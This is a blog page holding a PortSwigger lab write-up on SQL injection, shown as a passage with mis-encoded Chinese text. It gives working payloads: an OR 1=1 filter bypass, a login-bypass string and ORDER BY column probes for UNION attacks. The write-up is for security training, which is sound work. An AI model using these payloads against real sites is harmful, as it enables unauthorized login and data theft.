<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-rc.14">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <meta property="og:url" content="https://sakee.cn/sake-s-blog/blogs/%E6%8A%80%E6%9C%AF/PortSwigger-Writeup.html"><meta property="og:site_name" content="sake's blog"><meta property="og:title" content="PortSwigger-Writeup"><meta property="og:description" content="ä¹‹å‰å°†PortSwiggerçš„æ¯ä¸ªWriteupéƒ½ä½œä¸ºå•ç‹¬çš„æ–‡ç« ï¼Œå¯¼è‡´åšå®¢è¢«è¿™ä¸ªåˆ·å±ğŸ˜© ç°åœ¨å°†è¿™äº›Writeupåšä¸ªæ±‡æ€»ï¼ŒåŒ…å«è¿™å‡ ä¸ªéƒ¨åˆ†ğŸ“šï¼š SQLI XSS SSTI å‘½ä»¤æ³¨å…¥ ç›®å½•éå† CORS Authentication è¶Šæƒ æœ¬æ–‡æ‰€è°ˆåŠæŠ€æœ¯åªä¸ºç½‘ç»œå®‰å…¨äººå‘˜è¿›è¡ŒæœåŠ¡å™¨æ£€æµ‹æˆ–ç»´æŠ¤å‚è€ƒï¼Œä»…ä¾›å­¦ä¹ äº¤æµï¼Œè¯·å‹¿ç”¨äºè¿æ³•ç”¨é€”ã€‚ SQLI æƒ³åˆ°ä¹‹å‰sql..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-08-10T20:00:17.000Z"><meta property="article:author" content="fullstacksake"><meta property="article:tag" content="Web"><meta property="article:tag" content="SQLI"><meta property="article:tag" content="å‘½ä»¤æ³¨å…¥"><meta property="article:tag" content="ç›®å½•éå†"><meta property="article:tag" content="CORS"><meta property="article:tag" content="Authentication"><meta property="article:tag" content="è¶Šæƒ"><meta property="article:published_time" content="2022-11-08T16:00:00.000Z"><meta property="article:modified_time" content="2024-08-10T20:00:17.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"PortSwigger-Writeup","image":[""],"datePublished":"2022-11-08T16:00:00.000Z","dateModified":"2024-08-10T20:00:17.000Z","author":[{"@type":"Person","name":"fullstacksake","email":"fullstacksake@outlook.com"}]}</script><meta property="og:url" content="https://sakee.cn/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html"><link rel="stylesheet" href="/css/katex.min.css"><link rel="stylesheet" href="/css/github-markdown.min.css"><link rel="icon" href="/favicon.ico"><meta name="description" content="SAKEçš„åšå®¢ fullstacksakeçš„æŠ€æœ¯åˆ†äº«åšå®¢"><meta name="viewport" content="width=device-width,initial-scale=0.8,user-scalable=no"><title>PortSwigger-Writeup | sake's blog</title>
    <link rel="preload" href="/sake-s-blog/assets/style-DgoDEBOF.css" as="style"><link rel="stylesheet" href="/sake-s-blog/assets/style-DgoDEBOF.css">
    <link rel="modulepreload" href="/sake-s-blog/assets/app-D-TC3Ll_.js"><link rel="modulepreload" href="/sake-s-blog/assets/PortSwigger-Writeup.html-CY2j_Svj.js">
    
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container series--no show-catalog"><header class="navbar-container not-open"><div class="navbar-inner"><div class="site-brand nav-item"><img class="logo" src="/sake-s-blog/logo_transparent.png" alt="sake&#39;s blog"><a href="/sake-s-blog/" class="site-name can-hide">sake&#39;s blog</a></div><div class="nav-item navbar-links-wrapper" style=""><div><form class="search-box" role="search"><input type="search" autocomplete="off" spellcheck="false" value><!----></form></div><nav class="navbar-links"><!--[--><div class="navbar-links__item"><a href="/sake-s-blog/posts" class="link" aria-label="åšå®¢"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M4 24h10v2H4z" fill="currentColor"></path><path d="M4 18h10v2H4z" fill="currentColor"></path><path d="M26 14H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h20a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2zM6 6v6h20V6z" fill="currentColor"></path><path d="M26 28h-6a2 2 0 0 1-2-2v-6a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2zm-6-8v6h6v-6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->åšå®¢<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/sake-s-blog/timeline" class="link" aria-label="å½’æ¡£"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M14 19h4v2h-4z" fill="currentColor"></path><path d="M6 2v26a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2zm18 26H8V16h16zm0-14H8v-4h16zM8 8V4h16v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å½’æ¡£<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/sake-s-blog/categories/jishu/1" class="link" aria-label="åˆ†ç±»"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M6.76 6l.45.89L7.76 8H12v5H4V6h2.76m.62-2H3a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V7a1 1 0 0 0-1-1H9l-.72-1.45a1 1 0 0 0-.9-.55z" fill="currentColor"></path><path d="M22.76 6l.45.89l.55 1.11H28v5h-8V6h2.76m.62-2H19a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V7a1 1 0 0 0-1-1h-4l-.72-1.45a1 1 0 0 0-.9-.55z" fill="currentColor"></path><path d="M6.76 19l.45.89l.55 1.11H12v5H4v-7h2.76m.62-2H3a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1H9l-.72-1.45a1 1 0 0 0-.9-.55z" fill="currentColor"></path><path d="M22.76 19l.45.89l.55 1.11H28v5h-8v-7h2.76m.62-2H19a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1h-4l-.72-1.45a1 1 0 0 0-.9-.55z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->åˆ†ç±»<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/sake-s-blog/tags/AI/1" class="link" aria-label="æ ‡ç­¾"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><circle cx="10" cy="14" r="2" fill="currentColor"></circle><path d="M16 30a1 1 0 0 1-.71-.29L4.59 19A2 2 0 0 1 4 17.59V10a2 2 0 0 1 2-2h7.59a2 2 0 0 1 1.41.59l10.71 10.7a1 1 0 0 1 0 1.42l-9 9A1 1 0 0 1 16 30zM6 10v7.59l10 10L23.59 20l-10-10z" fill="currentColor"></path><path d="M27.71 13.29L17 2.59A2 2 0 0 0 15.59 2H8a2 2 0 0 0-2 2v2h2V4h7.59l10 10l-1.3 1.29l1.42 1.42l2-2a1 1 0 0 0 0-1.42z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->æ ‡ç­¾<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/sake-s-blog/docs/guide/friends" class="link" aria-label="å‹é“¾"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M25 10H7a3.003 3.003 0 0 0-3 3v6a2.002 2.002 0 0 0 2 2v7a2.002 2.002 0 0 0 2 2h4a2.002 2.002 0 0 0 2-2V16h-2v12H8v-9H6v-6a1 1 0 0 1 1-1h18a1 1 0 0 1 1 1v6h-2v9h-4V16h-2v12a2.002 2.002 0 0 0 2 2h4a2.002 2.002 0 0 0 2-2v-7a2.002 2.002 0 0 0 2-2v-6a3.003 3.003 0 0 0-3-3z" fill="currentColor"></path><path d="M10 9a4 4 0 1 1 4-4a4.004 4.004 0 0 1-4 4zm0-6a2 2 0 1 0 2 2a2.002 2.002 0 0 0-2-2z" fill="currentColor"></path><path d="M22 9a4 4 0 1 1 4-4a4.004 4.004 0 0 1-4 4zm0-6a2 2 0 1 0 2 2a2.002 2.002 0 0 0-2-2z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å‹é“¾<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/sake-s-blog/docs/guide/About" class="link" aria-label="å…³äº"><!--[--><!--]--><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M12 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M22 30h-2v-5a5 5 0 0 0-5-5H9a5 5 0 0 0-5 5v5H2v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path><path d="M22 4h10v2H22z" fill="currentColor"></path><path d="M22 9h10v2H22z" fill="currentColor"></path><path d="M22 14h7v2h-7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->å…³äº<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><div class="dropdown-link"><button class="dropdown-link__title" type="button" aria-label="series"><span class="xicon-container left title"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M12 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M22 30h-2v-5a5 5 0 0 0-5-5H9a5 5 0 0 0-5 5v5H2v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path><path d="M22 4h10v2H22z" fill="currentColor"></path><path d="M22 9h10v2H22z" fill="currentColor"></path><path d="M22 14h7v2h-7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->series<!--]--></span></span><span class="arrow down"></span></button><button class="dropdown-link--mobile__title" type="button" aria-label="series"><span class="title"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M12 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M22 30h-2v-5a5 5 0 0 0-5-5H9a5 5 0 0 0-5 5v5H2v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path><path d="M22 4h10v2H22z" fill="currentColor"></path><path d="M22 9h10v2H22z" fill="currentColor"></path><path d="M22 14h7v2h-7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->series<!--]--></span></span></span><span class="right arrow"></span></button><ul style="display:none;" class="dropdown-link__container"><!--[--><li class="dropdown-link__item"><a href="/sake-s-blog/docs/theme-reco/theme" class="link" aria-label="vuepress-reco"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->vuepress-reco<!--]--></span></span><!--[--><!--]--></a></li><li class="dropdown-link__item"><a href="/sake-s-blog/blogs/other/guide" class="link" aria-label="vuepress-theme-reco"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->vuepress-theme-reco<!--]--></span></span><!--[--><!--]--></a></li><!--]--></ul></div></div><div class="navbar-links__item"><a class="link" href="https://github.com/fullstack-sake/sake-s-blog" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->GitHub<!--]--></span></span><span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!--[--><!--]--></a></div><!--]--></nav><span class="xicon-container btn-toggle-dark-mode btn--dark-mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M15 2h2v3h-2z" fill="currentColor"></path><path d="M27 15h3v2h-3z" fill="currentColor"></path><path d="M15 27h2v3h-2z" fill="currentColor"></path><path d="M2 15h3v2H2z" fill="currentColor"></path><path d="M5.45 6.884l1.414-1.415l2.121 2.122l-1.414 1.414z" fill="currentColor"></path><path d="M23 7.58l2.121-2.12l1.414 1.414l-2.121 2.121z" fill="currentColor"></path><path d="M23.002 24.416l1.415-1.414l2.12 2.122l-1.413 1.414z" fill="currentColor"></path><path d="M5.47 25.13L7.59 23L9 24.42l-2.12 2.12l-1.41-1.41z" fill="currentColor"></path><path d="M16 8a8 8 0 1 0 8 8a8 8 0 0 0-8-8zm0 14a6 6 0 0 1 0-12z" fill="currentColor"></path></svg></span><span class="xicon-container btn-toggle-menus"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:inherit;"><circle cx="16" cy="8" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="24" r="2" fill="currentColor"></circle></svg></span></div></div></header><!----><!----><!----><!--[--><main class="page-container"><aside class="series-container"><!--[--><!--]--></aside><div class="page-content"><h1 class="page-title">PortSwigger-Writeup</h1><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->SAKE<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->2022/11/09<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[--><!--[--><a href="/sake-s-blog/categories/jishu/1.html" class="">æŠ€æœ¯</a><!--]--><!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[--><!--[--><a href="/sake-s-blog/tags/Web/1.html" class="">Web</a><a href="/sake-s-blog/tags/SQLI/1.html" class="">SQLI</a><a href="/sake-s-blog/tags/minglingzhuru/1.html" class="">å‘½ä»¤æ³¨å…¥</a><a href="/sake-s-blog/tags/mulubianli/1.html" class="">ç›®å½•éå†</a><a href="/sake-s-blog/tags/CORS/1.html" class="">CORS</a><a href="/sake-s-blog/tags/Authentication/1.html" class="">Authentication</a><a href="/sake-s-blog/tags/yuequan/1.html" class="">è¶Šæƒ</a><!--]--><!--]--></span></span><!----></div><div class="theme-reco-md-content"><div><blockquote><p>ä¹‹å‰å°†PortSwiggerçš„æ¯ä¸ªWriteupéƒ½ä½œä¸ºå•ç‹¬çš„æ–‡ç« ï¼Œå¯¼è‡´åšå®¢è¢«è¿™ä¸ªåˆ·å±ğŸ˜©</p><p>ç°åœ¨å°†è¿™äº›Writeupåšä¸ªæ±‡æ€»ï¼ŒåŒ…å«è¿™å‡ ä¸ªéƒ¨åˆ†ğŸ“šï¼š</p><ul><li><p>SQLI</p></li><li><p>XSS</p></li><li><p>SSTI</p></li><li><p>å‘½ä»¤æ³¨å…¥</p></li><li><p>ç›®å½•éå†</p></li><li><p>CORS</p></li><li><p>Authentication</p></li><li><p>è¶Šæƒ</p></li></ul></blockquote><blockquote><p><strong>æœ¬æ–‡æ‰€è°ˆåŠæŠ€æœ¯åªä¸ºç½‘ç»œå®‰å…¨äººå‘˜è¿›è¡ŒæœåŠ¡å™¨æ£€æµ‹æˆ–ç»´æŠ¤å‚è€ƒï¼Œä»…ä¾›å­¦ä¹ äº¤æµï¼Œè¯·å‹¿ç”¨äºè¿æ³•ç”¨é€”ã€‚</strong></p></blockquote><h1 id="sqli" tabindex="-1"><a class="header-anchor" href="#sqli"><span><strong>SQLI</strong></span></a></h1><p><strong>æƒ³åˆ°ä¹‹å‰sqlæ³¨å…¥ä¸€ç›´éƒ½åªæ˜¯ç”¨sqlmapä¸€æŠŠæ¢­ï¼ŒğŸ¥¬ğŸ¶æ‰‹æ³¨å®Œå…¨ä¸ä¼šï¼ˆğŸ˜­åˆ«éª‚äº†ï¼Œå†éª‚äººéƒ½è¦å‚»äº†ï¼‰ï¼Œæ‰€ä»¥æƒ³æ‰“ä¸ªburpå®˜æ–¹çš„é¶åœºå…ˆğŸ˜‹ï¼Œè®°å½•ä¸€ä¸‹ğŸ“ã€‚</strong></p><p>ï¼ˆå¤šå›¾ï¼Œæ³¨æ„æµé‡ï¼Œæœ‰äº›å›¾ç‰‡å¯èƒ½åŠ è½½ä¸æˆåŠŸï¼‰</p><p><img src="/sake-s-blog/assets/image-20221109195416814-C1ubpfPB.png" alt="image-20221109195416814"></p><blockquote><p><strong>SQL æ³¨å…¥ (SQLi) æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å¹²æ‰°åº”ç”¨ç¨‹åºå¯¹å…¶æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…æŸ¥çœ‹ä»–ä»¬é€šå¸¸æ— æ³•æ£€ç´¢çš„æ•°æ®ã€‚è¿™å¯èƒ½åŒ…æ‹¬å±äºå…¶ä»–ç”¨æˆ·çš„æ•°æ®ï¼Œæˆ–åº”ç”¨ç¨‹åºæœ¬èº«èƒ½å¤Ÿè®¿é—®çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹æˆ–åˆ é™¤è¿™äº›æ•°æ®ï¼Œä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºçš„å†…å®¹æˆ–è¡Œä¸ºå‘ç”ŸæŒç»­å˜åŒ–ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥å‡çº§ SQL æ³¨å…¥æ”»å‡»ä»¥ç ´ååº•å±‚æœåŠ¡å™¨æˆ–å…¶ä»–åç«¯åŸºç¡€æ¶æ„ï¼Œæˆ–æ‰§è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</strong></p></blockquote><hr><h2 id="whereå­å¥ä¸­çš„sqlæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®" tabindex="-1"><a class="header-anchor" href="#whereå­å¥ä¸­çš„sqlæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®"><span><strong>WHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®</strong></span></a></h2><blockquote><p><strong>è‰ğŸŒ¿ï¼Œåšå®Œäº†è¿˜ä¸èƒ½å†æ¬¡è®¿é—®é¶åœºå¤ç°çš„ï¼Œä¼šè¢«ç›´æ¥é‡å®šå‘åˆ° https://portswigger.net ï¼Œç›´æ¥ä¸¢ä¸ªpayloadå§</strong></p><p>è¡¥å……ï¼šè¿™é‡Œæˆ‘ä»¬äº†è§£ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨<strong>æ³¨é‡Š</strong>æ¥<strong>æˆªæ–­</strong>ğŸš«æŸ¥è¯¢å¹¶åˆ é™¤åŸå§‹æŸ¥è¯¢ä¸­æ‚¨è¾“å…¥ä¹‹åçš„éƒ¨åˆ†</p><table><thead><tr><th>æ•°æ®åº“</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>ç”²éª¨æ–‡</td><td>--comment</td></tr><tr><td>å¾®è½¯</td><td>--comment<br>/*comment*/</td></tr><tr><td>PostgreSQL</td><td>--comment<br>/*comment*/</td></tr><tr><td>MySQL</td><td>#comment<br>-- comment <strong>[æ³¨æ„åŒç ´æŠ˜å·åçš„ç©ºæ ¼]</strong><br>/*comment*/</td></tr></tbody></table></blockquote><p><img src="/sake-s-blog/assets/image-20221109211420823-dxOSk0z_.png" alt="image-20221109211420823"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">/filter?category=Gifts&#39; or 1=1--</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="å…è®¸ç»•è¿‡ç™»å½•çš„sqlæ³¨å…¥æ¼æ´" tabindex="-1"><a class="header-anchor" href="#å…è®¸ç»•è¿‡ç™»å½•çš„sqlæ³¨å…¥æ¼æ´"><span><strong>å…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´</strong></span></a></h2><blockquote><p>ç”¨æˆ·è¿›è¡Œç”¨æˆ·åå’Œå¯†ç éªŒè¯æ—¶ï¼Œç½‘ç«™éœ€è¦æŸ¥è¯¢æ•°æ®åº“ã€‚æŸ¥è¯¢æ•°æ®åº“å°±æ˜¯æ‰§è¡Œç±»ä¼¼äºè¿™æ ·çš„SQLè¯­å¥<code>SELECT * FROM admin WHERE Username= &#39;username&#39; AND Password= &#39;password&#39;</code>ï¼Œç”±äºç½‘ç«™åå°åœ¨è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢çš„æ—¶å€™æ²¡æœ‰å¯¹<strong>å•å¼•å·</strong>è¿›è¡Œè¿‡æ»¤ï¼Œå½“è¾“å…¥ç”¨æˆ·åå’Œä¸‡èƒ½å¯†ç <code>&#39; or 1=&#39;1</code>ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šä¸€é¢˜çš„<code>&#39; or 1=1--</code>ï¼‰æ—¶ï¼Œæ‰§è¡Œçš„SQLè¯­å¥ä¸º<code>SELECT * FROM admin WHERE Username= &#39;username&#39; or 1=&#39;1&#39; AND Password= &#39;password&#39; or 1=&#39;1&#39;</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªé€»è¾‘è¿ç®—ç»“æœæ’ä¸ºTRUEã€‚SQLè¯­å¥çš„æŸ¥è¯¢ç»“æœä¸ºTRUEï¼Œå°±æ„å‘³ç€è®¤è¯æˆåŠŸï¼Œä¹Ÿå¯ä»¥ç™»å½•åˆ°ç³»ç»Ÿä¸­ã€‚</p></blockquote><p>ç‚¹å‡»æ‰“å¼€My accountï¼Œè¿›å…¥ç™»å½•ç•Œé¢</p><p><img src="/sake-s-blog/assets/image-20221109212705321-Dw1fbAsO.png" alt="image-20221109212705321"></p><p>å°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç <code>&#39; or 1=&#39;1</code>ç™»å½•</p><p><img src="/sake-s-blog/assets/image-20221109213452475-DSiY7Ka-.png" alt="image-20221109213452475"></p><p>æˆåŠŸç™»å½•åˆ°administrator</p><p><img src="/sake-s-blog/assets/image-20221109213616285-CS1cWVLi.png" alt="image-20221109213616285"></p><p>payloadï¼š</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">admin&#39; or 1=&#39;1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="unionæ”»å‡»æŸ¥è¯¢è¿”å›çš„åˆ—æ•°" tabindex="-1"><a class="header-anchor" href="#unionæ”»å‡»æŸ¥è¯¢è¿”å›çš„åˆ—æ•°"><span><strong>UNIONæ”»å‡»æŸ¥è¯¢è¿”å›çš„åˆ—æ•°</strong></span></a></h2><blockquote><p><strong>æ‰§è¡ŒSQLæ³¨å…¥UNIONæ”»å‡»æ—¶ï¼Œæœ‰ä¸¤ç§æœ‰æ•ˆçš„æ–¹æ³•æ¥ç¡®å®šä»åŸå§‹æŸ¥è¯¢è¿”å›å¤šå°‘åˆ—ã€‚</strong></p><ul><li><p>ç¬¬ä¸€ç§æ–¹æ³•æ¶‰åŠæ³¨å…¥ä¸€ç³»åˆ—ORDER BYå­å¥ï¼Œå¹¶é€’å¢æŒ‡å®šçš„åˆ—ç´¢å¼•ï¼Œç›´åˆ°å‘ç”Ÿé”™è¯¯âŒä¸ºæ­¢ã€‚</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre class="language-text"><code><span class="line">&#39; ORDER BY 1-- </span>
<span class="line">&#39; ORDER BY 2-- </span>
<span class="line">&#39; ORDER BY 3-- </span>
